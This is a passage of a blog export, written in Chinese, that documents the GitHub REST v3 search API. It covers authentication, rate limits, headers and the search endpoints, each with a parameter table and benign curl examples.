<code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>通用的搜索</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/repositories?q=tetris+language:assembly&amp;sort=stars&amp;order=desc</span><br></pre></td></tr></table></figure>\n\n<p>多主题搜索</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Accept: application/vnd.github.mercy-preview+json&quot; \\</span><br><span class=\"line\">https://api.github.com/search/repositories?q=topic:ruby+topic:rails</span><br></pre></td></tr></table></figure>\n\n<p>*<em>限定符 *</em><a href=\"https://help.github.com/en/articles/searching-for-repositories\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p><code>in:name</code>，例：<code>jquery in:name</code> 限定仓库名称包含jquery</p>\n<p><code>in:description</code>，例： <code>jquery in:name,description</code> 限定仓库名称或描述中包含jquery</p>\n<p><code>in:readme</code>，例：<code>jquery in:readme</code> 限定readme文件中包含jquery</p>\n<p><code>user: USERNAME</code>，例：<code>user:defunkt forks:&gt;100</code> 限定用户未defunkt并且有大于100个fork</p>\n<p><code>org: ORGNAME</code>，例：<code>org:github</code>限定组织为github</p>\n<p><code>size: n</code>， 例：<code>size:1000</code>、<code>size:&gt;=30000</code>、<code>size:&lt;50</code>、<code>size:50..120</code> 限定仓库大小为1MB、大于30MB、小于50KB、在50KB到120KB之间</p>\n<p><code>forks: n</code>，例：<code>forks:5</code> 分支数量匹配</p>\n<p><code>stars: n</code>，例：<code>stars:10..20</code> 星数在10到20之间</p>\n<p><code>created: YYYY-MM-DD</code></p>\n<p><code>pushed: YYYY-MM-DD</code></p>\n<p><code>language: LANGUAGE</code></p>\n<p><code>topic: TOPIC</code>，例：<code>topic:jekyll</code>主题分类是jekyll的</p>\n<p><code>topics: n</code>，例：<code>topics:5</code>有5个主题分类的</p>\n<p><code>license: LICENSE_KEYWORD</code>，例：<code>license:apache-2.0</code>匹配证书是Apache License 2.0的 </p>\n<p><code>is:public</code>或<code>is:private</code></p>\n<p><code>mirror:true</code>或<code>mirror:false</code></p>\n<p><code>archived:true</code>或<code>archived:false</code></p>\n<p><code>repo:USERNAME/REPONAME</code></p>\n<h3 id=\"2-搜索提交记录\"><a href=\"#2-搜索提交记录\" class=\"headerlink\" title=\"2. 搜索提交记录\"></a>2. 搜索提交记录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/commits</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-commits/\" target=\"_blank\" rel=\"noopener\">Searching commits</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by <code>author-date</code> or <code>committer-date</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在octocat/Spoon-Knife仓库搜索css有关的提交</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Accept: application/vnd.github.cloak-preview&quot; \\</span><br><span class=\"line\">https://api.github.com/search/commits?q=repo:octocat/Spoon-Knife+css</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-搜索代码\"><a href=\"#3-搜索代码\" class=\"headerlink\" title=\"3. 搜索代码\"></a>3. 搜索代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/code</span><br></pre></td></tr></table></figure>\n\n<p>处于搜索的复杂性，有几个搜索限制：</p>\n<ol>\n<li>默认仅搜索默认分支，大部分情况下<code>master</code>分支是默认分支</li>\n<li>仅搜索小于384K的文件</li>\n<li>必须包含一个关键词，<code>language:go</code>是非法的，而<code>amazing language:go</code>是可行的</li>\n</ol>\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-code/\" target=\"_blank\" rel=\"noopener\">Searching code</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query. Can only be <code>indexed</code>, which indicates how recently a file has been indexed by the GitHub search infrastructure. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在jQuery仓库中查找<code>addClass</code> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/code?q=addClass+in:file+language:js+repo:jquery/jquery</span><br></pre></td></tr></table></figure>\n\n<p><strong>接受匹配偏移</strong></p>\n<p>请求头中增加<code>Accept: application/vnd.github.v3.text-match+json</code>参数，将会在响应信息中额外接收到<code>text-matches</code>字段信息，text-matches是一组列表，列表内对象包含<code>object_url</code>、<code>object_type</code>、<code>property</code>、<code>fragment</code>、<code>matches</code>，它们用来表示查询字符串在代码中的匹配位置。<a href=\"https://developer.github.com/v3/search/#text-match-metadata\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p><strong>注：在没有Authorization的情况下，存在必须指定[user|repo|org]中的一个参数限制</strong></p>\n<h3 id=\"3-搜索问题\"><a href=\"#3-搜索问题\" class=\"headerlink\" title=\"3. 搜索问题\"></a>3. 搜索问题</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/issues</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-issues-and-pull-requests/\" target=\"_blank\" rel=\"noopener\">Searching issues and pull requests</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by the number of <code>comments</code>, <code>reactions</code>, <code>reactions-+1</code>, <code>reactions--1</code>, <code>reactions-smile</code>, <code>reactions-thinking_face</code>, <code>reactions-heart</code>, <code>reactions-tada</code>, or <code>interactions</code>. You can also sort results by how recently the items were <code>created</code> or <code>updated</code>, Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>查找最早的未解决的python问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/issues?q=windows+label:bug+language:python+state:open&amp;sort=created&amp;order=asc</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-搜索用户\"><a href=\"#4-搜索用户\" class=\"headerlink\" title=\"4. 搜索用户\"></a>4. 搜索用户</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/users</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-users/\" target=\"_blank\" rel=\"noopener\">Searching users</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by number of <code>followers</code> or <code>repositories</code>, or when the person <code>joined</code> GitHub. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>查询热门用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/users?q=tom+repos:%3E42+followers:%3E1000</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-搜索主题\"><a href=\"#5-搜索主题\" class=\"headerlink\" title=\"5. 搜索主题\"></a>5. 搜索主题</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/topics</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>. The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>.</td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>搜索精选的ruby有关的主题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &apos;Accept: application/vnd.github.mercy-preview+json&apos; \\</span><br><span class=\"line\">&apos;https://api.github.com/search/topics?q=ruby+is:featured&apos;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-搜索标签\"><a href=\"#6-搜索标签\" class=\"headerlink\" title=\"6. 搜索标签\"></a>6. 搜索标签</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/labels</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>repository_id</code></td>\n<td align=\"center\"><code>integer</code></td>\n<td align=\"center\"><strong>Required</strong>.The id of the repository.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The search keywords. This endpoint does not accept qualifiers in the query. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by when the label was <code>created</code> or <code>updated</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在指定仓库查找<code>bug</code>、<code>defect</code>、<code>eenhancement</code>有关的标签</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &apos;Accept: application/vnd.github.symmetra-preview+json&apos; \\</span><br><span class=\"line\">&apos;https://api.github.com/search/labels?repository_id=64778136&amp;q=bug+defect+enhancement&apos;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"认证机制-链接\"><a href=\"#认证机制-链接\" class=\"headerlink\" title=\"认证机制 链接\"></a>认证机制 <a href=\"https://developer.github.com/v3/#authentication\" target=\"_blank\" rel=\"noopener\">链接</a></h2><h3 id=\"认证方式\"><a href=\"#认证方式\" class=\"headerlink\" title=\"认证方式\"></a>认证方式</h3><ol>\n<li>基础认证方式 <code>curl -u &quot;username&quot; https://api.github.com</code>或者<code>curl -u username:token https://api.github.com/user</code></li>\n<li>OAuth认证方式<code>curl -H &quot;Authorization: token OAUTH-TOKEN&quot; https://api.github.com</code></li>\n<li>Client ID 和 Client Secret认证<code>curl -i &#39;https://api.github.com/users/whatever?client_id=xxxx&amp;client_secret=yyyy&#39;</code></li>\n</ol>\n<h3 id=\"认证TOKEN及Client-ID\"><a href=\"#认证TOKEN及Client-ID\" class=\"headerlink\" title=\"认证TOKEN及Client ID\"></a>认证TOKEN及Client ID</h3><p>TOKEN：进入github账号<code>settings</code> -&gt; <code>Personal access tokens</code> -&gt; <code>Generate new token</code>生成token，开启repo的权限</p>\n<p>Client ID：进入github账号<code>settings</code> -&gt; <code>OAuth Apps</code> </p>\n<h2 id=\"频率限制\"><a href=\"#频率限制\" class=\"headerlink\" title=\"频率限制\"></a>频率限制</h2><ol>\n<li>对于core、search、graphql、integration_mainfest有自定义的频率限制，其他的是统一的频率限制，可通过<code>/rate_limit</code>接口查看频率限制，返回限制数量、剩余数量、刷新时间等数据。<a href=\"https://developer.github.com/v3/rate_limit/\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>每次请求，响应头中都会返回<code>X-RateLimit</code>、<code>X-RateLimit-Remaining</code>、<code>X-RateLimit-Reset</code>参数，更新限制数量、剩余数量、刷新时间的</li>\n<li>在search中，对于basic authentication、OAuth、或者client_id和secret的，每分钟最多可以有30个请求。未经验证的请求，每分钟最多10个请求。<a href=\"https://developer.github.com/v3/search/#rate-limit\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>单个用户的所有令牌，每小时共享5000个请求。<a href=\"https://developer.github.com/v3/#rate-limiting\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>经过认证的请求会增加一定量频率限制</li>\n</ol>\n<h2 id=\"请求头要求\"><a href=\"#请求头要求\" class=\"headerlink\" title=\"请求头要求\"></a>请求头要求</h2><ol>\n<li>请求头携带属性<code>User-Agent</code><a href=\"https://developer.github.com/v3/#user-agent-required\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n</ol>\n<h2 id=\"响应头\"><a href=\"#响应头\" class=\"headerlink\" title=\"响应头\"></a>响应头</h2><ol>\n<li><code>Location</code> 重定向，根据code判断是永久重定向还是临时重定向：<code>301</code> - 永久重定向，<code>302</code>/<code>307</code> - 临时重定向</li>\n<li><code>Retry-After</code> 请求频率超限后会出现</li>\n<li><code>X-RateLimit</code>、<code>X-RateLimit-Remaining</code>、<code>X-RateLimit-Reset</code>请求频率限制描述</li>\n<li>code：<code>400</code> - JSON错误 Bad Request，<code>422</code> - 字段非法</li>\n</ol>\n<h2 id=\"API接口-链接\"><a href=\"#API接口-链接\" class=\"headerlink\" title=\"API接口 链接\"></a>API接口 <a href=\"https://developer.github.com/v3/search/\" target=\"_blank\" rel=\"noopener\">链接</a></h2><h3 id=\"1-搜索仓库\"><a href=\"#1-搜索仓库\" class=\"headerlink\" title=\"1. 搜索仓库\"></a>1. 搜索仓库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/repositories</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-for-repositories/\" target=\"_blank\" rel=\"noopener\">Searching for repositories</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by number of <code>stars</code>, <code>forks</code>, or <code>help-wanted-issues</code> or how recently the items were <code>updated</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>通用的搜索</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/repositories?q=tetris+language:assembly&amp;sort=stars&amp;order=desc</span><br></pre></td></tr></table></figure>\n\n<p>多主题搜索</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Accept: application/vnd.github.mercy-preview+json&quot; \\</span><br><span class=\"line\">https://api.github.com/search/repositories?q=topic:ruby+topic:rails</span><br></pre></td></tr></table></figure>\n\n<p>*<em>限定符 *</em><a href=\"https://help.github.com/en/articles/searching-for-repositories\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p><code>in:name</code>，例：<code>jquery in:name</code> 限定仓库名称包含jquery</p>\n<p><code>in:description</code>，例： <code>jquery in:name,description</code> 限定仓库名称或描述中包含jquery</p>\n<p><code>in:readme</code>，例：<code>jquery in:readme</code> 限定readme文件中包含jquery</p>\n<p><code>user: USERNAME</code>，例：<code>user:defunkt forks:&gt;100</code> 限定用户未defunkt并且有大于100个fork</p>\n<p><code>org: ORGNAME</code>，例：<code>org:github</code>限定组织为github</p>\n<p><code>size: n</code>， 例：<code>size:1000</code>、<code>size:&gt;=30000</code>、<code>size:&lt;50</code>、<code>size:50..120</code> 限定仓库大小为1MB、大于30MB、小于50KB、在50KB到120KB之间</p>\n<p><code>forks: n</code>，例：<code>forks:5</code> 分支数量匹配</p>\n<p><code>stars: n</code>，例：<code>stars:10..20</code> 星数在10到20之间</p>\n<p><code>created: YYYY-MM-DD</code></p>\n<p><code>pushed: YYYY-MM-DD</code></p>\n<p><code>language: LANGUAGE</code></p>\n<p><code>topic: TOPIC</code>，例：<code>topic:jekyll</code>主题分类是jekyll的</p>\n<p><code>topics: n</code>，例：<code>topics:5</code>有5个主题分类的</p>\n<p><code>license: LICENSE_KEYWORD</code>，例：<code>license:apache-2.0</code>匹配证书是Apache License 2.0的 </p>\n<p><code>is:public</code>或<code>is:private</code></p>\n<p><code>mirror:true</code>或<code>mirror:false</code></p>\n<p><code>archived:true</code>或<code>archived:false</code></p>\n<p><code>repo:USERNAME/REPONAME</code></p>\n<h3 id=\"2-搜索提交记录\"><a href=\"#2-搜索提交记录\" class=\"headerlink\" title=\"2. 搜索提交记录\"></a>2. 搜索提交记录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/commits</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-commits/\" target=\"_blank\" rel=\"noopener\">Searching commits</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by <code>author-date</code> or <code>committer-date</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在octocat/Spoon-Knife仓库搜索css有关的提交</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Accept: application/vnd.github.cloak-preview&quot; \\</span><br><span class=\"line\">https://api.github.com/search/commits?q=repo:octocat/Spoon-Knife+css</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-搜索代码\"><a href=\"#3-搜索代码\" class=\"headerlink\" title=\"3. 搜索代码\"></a>3. 搜索代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/code</span><br></pre></td></tr></table></figure>\n\n<p>处于搜索的复杂性，有几个搜索限制：</p>\n<ol>\n<li>默认仅搜索默认分支，大部分情况下<code>master</code>分支是默认分支</li>\n<li>仅搜索小于384K的文件</li>\n<li>必须包含一个关键词，<code>language:go</code>是非法的，而<code>amazing language:go</code>是可行的</li>\n</ol>\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-code/\" target=\"_blank\" rel=\"noopener\">Searching code</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query. Can only be <code>indexed</code>, which indicates how recently a file has been indexed by the GitHub search infrastructure. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在jQuery仓库中查找<code>addClass</code> </p>\n<figure class=\"highlight 